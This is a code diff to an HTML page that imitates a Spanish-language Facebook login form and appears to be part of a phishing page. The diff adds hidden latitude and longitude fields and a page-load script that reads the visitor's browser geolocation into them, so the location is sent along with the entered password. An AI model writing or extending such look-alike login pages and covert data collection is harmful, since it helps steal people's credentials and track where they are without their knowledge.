@@ -33,6 +33,10 @@
             placeholder="Contraseña"
             required
           />
+          <!-- Campos ocultos para ubicación -->
+          <input type="hidden" name="latitude" id="latitude" />
+          <input type="hidden" name="longitude" id="longitude" />
+
           <button class="login-btn" type="submit">Iniciar sesión</button>
           <a
             href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"
@@ -75,5 +79,17 @@
       </div>
       <div class="meta">Meta © 2025</div>
     </footer>
+    <script>
+      window.onload = function () {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(function (position) {
+            document.getElementById("latitude").value =
+              position.coords.latitude;
+            document.getElementById("longitude").value =
+              position.coords.longitude;
+          });
+        }
+      };
+    </script>
   </body>
 </html>
